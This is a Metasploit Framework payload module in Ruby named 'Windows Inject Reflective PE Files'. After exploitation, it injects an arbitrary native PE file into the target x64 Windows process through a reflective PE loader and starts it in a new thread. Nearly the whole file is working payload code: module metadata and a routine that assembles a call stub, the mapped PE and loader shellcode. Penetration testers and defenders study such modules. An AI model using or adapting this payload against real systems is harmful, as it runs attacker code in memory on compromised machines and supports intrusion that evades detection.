##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/windows/peinject'
require 'msf/core/payload/windows/x64/reflective_pe_loader'

###
#
# Injects an arbitrary PE file in the exploited process via reflective PE loader.
#
###
module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Windows::PEInject
  include Msf::Payload::Windows::ReflectivePELoader_x64

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Inject Reflective PE Files',
        'Description' => %q{
          Inject a custom native PE file into the exploited process using a reflective PE loader. Reflective PE payload
          will be started in a new thread inside the target process. This module requires a PE file which contains
          relocation data.
        },
        'Author' =>
          [
            'ege <egebalci[at]pm.me>'
          ],
        'References' =>
          [
            'https://github.com/EgeBalci/Amber'
          ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'PayloadCompat' =>
          {
            'Convention' => 'sockrdi handlerdi -http -https'
          }
      )
    )
  end

  def encapsulate_reflective_stub(mapped_pe, opts)
    call_size = mapped_pe.length + 5
    reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, "cld\ncall $+#{call_size}").encode_string
    reflective_loader += mapped_pe
    reflective_loader += Metasm::Shellcode.assemble(Metasm::X64.new, asm_reflective_pe_loader_x64(opts)).encode_string
  end
end
